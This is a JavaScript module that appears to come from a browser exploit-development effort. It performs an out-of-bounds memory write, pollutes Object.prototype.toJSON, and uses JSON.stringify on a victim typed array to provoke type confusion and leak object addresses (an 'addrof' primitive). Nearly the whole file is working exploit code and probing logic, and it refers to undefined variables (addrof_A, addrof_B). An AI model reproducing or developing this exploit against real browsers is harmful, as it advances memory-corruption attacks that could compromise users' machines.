// js/script3/testArrayBufferVictimCrash.mjs (v_typedArray_addrof_v24_ExploitReturnedMarker)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V24_ERM = "OriginalHeisenbug_TypedArrayAddrof_v24_ExploitReturnedMarker";

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
const OOB_WRITE_VALUE = 0xFFFFFFFF;

let object_to_leak_A_v24 = null;
let object_to_leak_B_v24 = null;
let victim_typed_array_ref_v24 = null; 
let probe_call_count_v24 = 0;
let returned_marker_object_v24 = null; // Guarda o objeto retornado pela P1

// Para o resultado final, guardaremos os detalhes da chamada que modificou o marcador
let last_details_of_marker_modification_v24 = null;

function toJSON_TA_Probe_ExploitMarker() {
    probe_call_count_v24++;
    const call_num = probe_call_count_v24;
    let current_call_details = { // Detalhes locais
        call_number: call_num,
        probe_variant: "TA_Probe_Addrof_v24_ExploitReturnedMarker",
        this_type: Object.prototype.toString.call(this),
        this_is_victim: (this === victim_typed_array_ref_v24),
        this_is_returned_marker: (this === returned_marker_object_v24 && returned_marker_object_v24 !== null),
        writes_to_marker_attempted: false,
        error_in_probe: null
    };
    logS3(`[${current_call_details.probe_variant}] Call #${call_num}. 'this' type: ${current_call_details.this_type}. IsVictim? ${current_call_details.this_is_victim}. IsReturnedMarker? ${current_call_details.this_is_returned_marker}`, "leak");

    try {
        if (call_num === 1 && current_call_details.this_is_victim) {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' is victim. Returning new marker object.`, "info");
            returned_marker_object_v24 = { 
                marker_id_v24: "MARKER_V24",
                data_A_slot: null, 
                data_B_slot: null 
            };
            last_details_of_marker_modification_v24 = current_call_details; // P1 details
            return returned_marker_object_v24;
        } else if (current_call_details.this_is_returned_marker) {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' IS returned_marker_object_v24. Current type: ${current_call_details.this_type}`, "info");
            if (current_call_details.this_type === '[object Object]') { 
                logS3(`[${current_call_details.probe_variant}] Call #${call_num}: TYPE CONFUSION ON RETURNED MARKER! Attempting writes...`, "vuln");
                if (object_to_leak_A_v24) this.data_A_slot = object_to_leak_A_v24;
                if (object_to_leak_B_v24) this.data_B_slot = object_to_leak_B_v24;
                current_call_details.writes_to_marker_attempted = true;
                logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Writes to marker 'this' attempted. Marker keys: ${Object.keys(this).join(',')}`, "info");
            } else {
                logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Returned marker 'this' is NOT [object Object]. Type: ${current_call_details.this_type}`, "warn");
            }
            last_details_of_marker_modification_v24 = current_call_details; // P2 details (or Px if controller is 'this')
            // Retornar o 'this' (o marcador modificado) para que JSON.stringify o serialize
            return this; 
        }
    } catch (e) {
        current_call_details.error_in_probe = (current_call_details.error_in_probe || "") + `ProbeErr: ${e.name}: ${e.message}`;
    }
    
    // Se a lógica acima não retornar, esta é uma chamada inesperada ou erro.
    // Atualizar os detalhes globais com esta chamada se for a mais recente.
    if(!last_details_of_marker_modification_v24 || call_num > (last_details_of_marker_modification_v24.call_number || 0) ) {
      last_details_of_marker_modification_v24 = current_call_details;
    }
    return { generic_probe_return_v24: call_num }; 
}

export async function executeTypedArrayVictimAddrofTest_ExploitReturnedMarker() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V24_ERM}.triggerAndLog`;
    logS3(`--- Initiating ${FNAME_CURRENT_TEST}: Heisenbug (ExploitReturnedMarker) & Addrof ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V24_ERM} Init...`;

    probe_call_count_v24 = 0;
    victim_typed_array_ref_v24 = null; 
    returned_marker_object_v24 = null;
    last_details_of_marker_modification_v24 = null;
    object_to_leak_A_v24 = { marker: "ObjA_TA_v24erm", id: Date.now() }; 
    object_to_leak_B_v24 = { marker: "ObjB_TA_v24erm", id: Date.now() + Math.floor(Math.random() * 1000) };

    let errorCapturedMain = null;
    let stringifyOutput_parsed = null; // Para o objeto parseado do JSON.stringify
    
    let addrof_Victim_A = { success: false, msg: "Addrof Victim A (victim_buffer[0]): Default" };
    let addrof_Victim_B = { success: false, msg: "Addrof Victim B (victim_buffer[1]): Default" };
    let addrof_Marker_A = { success: false, msg: "Addrof Marker.data_A_slot: Default"};
    let addrof_Marker_B = { success: false, msg: "Addrof Marker.data_B_slot: Default"};
    const fillPattern = 0.24242424242424;

    try {
        await triggerOOB_primitive({ force_reinit: true });
        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, OOB_WRITE_VALUE, 4);
        logS3(`  Critical OOB write to ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)} performed.`, "info", FNAME_CURRENT_TEST);
        await PAUSE_S3(100);

        victim_typed_array_ref_v24 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE)); 
        let float64_view_on_victim_buffer = new Float64Array(victim_typed_array_ref_v24.buffer); 
        for(let i = 0; i < float64_view_on_victim_buffer.length; i++) float64_view_on_victim_buffer[i] = fillPattern + i;
        logS3(`STEP 2: victim_typed_array_ref_v24 (Uint8Array) created.`, "test", FNAME_CURRENT_TEST);
        
        const ppKey = 'toJSON';
        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
        let pollutionApplied = false;

        try {
            Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_ExploitMarker, writable: true, configurable: true, enumerable: false });
            pollutionApplied = true;
            let rawStringifyOutput = JSON.stringify(victim_typed_array_ref_v24); 
            logS3(`  JSON.stringify completed. Raw Stringify Output: ${rawStringifyOutput}`, "info", FNAME_CURRENT_TEST);
            try {
                stringifyOutput_parsed = JSON.parse(rawStringifyOutput);
            } catch (e_parse) {
                logS3(`  Error parsing stringifyOutput: ${e_parse.message}`, "warn");
                stringifyOutput_parsed = { error_parsing_stringify_output: rawStringifyOutput };
            }
            
            logS3(`  Details of last probe call that modified marker (if any): ${last_details_of_marker_modification_v24 ? JSON.stringify(last_details_of_marker_modification_v24) : 'N/A'}`, "leak", FNAME_CURRENT_TEST);

            let heisenbugOnMarker = false;
            if (last_details_of_marker_modification_v24 && 
                last_details_of_marker_modification_v24.this_is_returned_marker &&
                last_details_of_marker_modification_v24.this_type === "[object Object]") {
                heisenbugOnMarker = true;
            }
            logS3(`  EXECUTE: Heisenbug on Returned Marker ${heisenbugOnMarker ? "CONFIRMED" : "NOT Confirmed"}. Last relevant probe type: ${last_details_of_marker_modification_v24 ? last_details_of_marker_modification_v24.this_type : 'N/A'}`, heisenbugOnMarker ? "vuln" : "error", FNAME_CURRENT_TEST);
                
            logS3("STEP 3: Checking victim buffer (should be unchanged)...", "warn", FNAME_CURRENT_TEST);
            // ... (Verificação de addrof_Victim_A e B, esperando que falhem)
            const val_A_victim = float64_view_on_victim_buffer[0];
            if (val_A_victim !== (fillPattern + 0)) addrof_Victim_A.msg = `Victim buffer[0] changed! Val: ${val_A_victim}`; else addrof_Victim_A.msg = `Victim buffer[0] unchanged.`;
            const val_B_victim = float64_view_on_victim_buffer[1];
            if (val_B_victim !== (fillPattern + 1)) addrof_Victim_B.msg = `Victim buffer[1] changed! Val: ${val_B_victim}`; else addrof_Victim_B.msg = `Victim buffer[1] unchanged.`;


            logS3("STEP 4: Checking stringifyOutput_parsed (the potentially modified marker object)...", "warn", FNAME_CURRENT_TEST);
            if (stringifyOutput_parsed && typeof stringifyOutput_parsed === 'object' && stringifyOutput_parsed.marker_id_v24 === "MARKER_V24") {
                logS3("  stringifyOutput_parsed IS the (potentially modified) marker object.", "info");
                const marker_val_A = stringifyOutput_parsed.data_A_slot;
                const marker_val_B = stringifyOutput_parsed.data_B_slot;

                if (typeof marker_val_A === 'number' && marker_val_A !==0) {
                    let mkr_A_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([marker_val_A]).buffer)[0], new Uint32Array(new Float64Array([marker_val_A]).buffer)[1]);
                    if (mkr_A_int64.high() < 0x00020000 || (mkr_A_int64.high() & 0xFFFF0000) === 0xFFFF0000) {
                       addrof_Marker_A.success = true; addrof_Marker_A.msg = `Possible pointer for data_A_slot in marker: ${mkr_A_int64.toString(true)}`;
                    } else { addrof_Marker_A.msg = `Marker.data_A_slot is number but not pointer-like: ${marker_val_A}`; }
                } else if (marker_val_A === object_to_leak_A_v24) {
                     addrof_Marker_A.success = true; addrof_Marker_A.msg = "object_to_leak_A_v24 identity found in marker.data_A_slot.";
                } else { addrof_Marker_A.msg = `Marker.data_A_slot not a pointer. Value: ${marker_val_A}`; }

                if (typeof marker_val_B === 'number' && marker_val_B !==0) {
                    let mkr_B_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([marker_val_B]).buffer)[0], new Uint32Array(new Float64Array([marker_val_B]).buffer)[1]);
                     if (mkr_B_int64.high() < 0x00020000 || (mkr_B_int64.high() & 0xFFFF0000) === 0xFFFF0000) {
                       addrof_Marker_B.success = true; addrof_Marker_B.msg = `Possible pointer for data_B_slot in marker: ${mkr_B_int64.toString(true)}`;
                    } else { addrof_Marker_B.msg = `Marker.data_B_slot is number but not pointer-like: ${marker_val_B}`; }
                } else if (marker_val_B === object_to_leak_B_v24) {
                     addrof_Marker_B.success = true; addrof_Marker_B.msg = "object_to_leak_B_v24 identity found in marker.data_B_slot.";
                } else { addrof_Marker_B.msg = `Marker.data_B_slot not a pointer. Value: ${marker_val_B}`; }
            } else {
                addrof_Marker_A.msg = "stringifyOutput was not the marker object or was null/error.";
                addrof_Marker_B.msg = "stringifyOutput was not the marker object or was null/error.";
            }

            if (addrof_Marker_A.success || addrof_Marker_B.success) { // Prioriza sucesso no marcador
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V24_ERM}: AddrInMarker SUCCESS!`;
            } else if (addrof_A.success || addrof_B.success) { // Sucesso (improvável) na vítima
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V24_ERM}: AddrInVictim SUCCESS!`;
            } else if (heisenbugOnMarker) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V24_ERM}: Marker TC OK, Addr Fail`;
            } else {
                 document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V24_ERM}: No Marker TC?`;
            }

        } catch (e_str) {
            errorCapturedMain = e_str;
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V24_ERM}: Stringify/Addrof ERR`;
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor); else delete Object.prototype[ppKey];
            }
        }
    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V24_ERM} CRITICAL FAIL`;
    } finally {
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Total probe calls: ${probe_call_count_v24}`, "info", FNAME_CURRENT_TEST);
        logS3(`Addrof Victim A: Success=${addrof_Victim_A.success}, Msg='${addrof_Victim_A.msg}'`, addrof_Victim_A.success ? "good" : "warn", FNAME_CURRENT_TEST);
        logS3(`Addrof Victim B: Success=${addrof_Victim_B.success}, Msg='${addrof_Victim_B.msg}'`, addrof_Victim_B.success ? "good" : "warn", FNAME_CURRENT_TEST);
        logS3(`Addrof Marker A: Success=${addrof_Marker_A.success}, Msg='${addrof_Marker_A.msg}'`, addrof_Marker_A.success ? "good" : "warn", FNAME_CURRENT_TEST);
        logS3(`Addrof Marker B: Success=${addrof_Marker_B.success}, Msg='${addrof_Marker_B.msg}'`, addrof_Marker_B.success ? "good" : "warn", FNAME_CURRENT_TEST);
        
        victim_typed_array_ref_v24 = null; 
        returned_marker_object_v24 = null;
        last_details_of_marker_modification_v24 = null;
        probe_call_count_v24 = 0;
    }
    return { 
        errorOccurred: errorCapturedMain, 
        potentiallyCrashed: false, 
        stringifyResult: stringifyOutput_parsed, // Retornar o objeto parseado
        toJSON_details: last_details_of_marker_modification_v24, 
        total_probe_calls: probe_call_count_v24,
        addrof_victim_A: addrof_Victim_A,
        addrof_victim_B: addrof_Victim_B,
        addrof_marker_A: addrof_Marker_A,
        addrof_marker_B: addrof_Marker_B,
    };
}
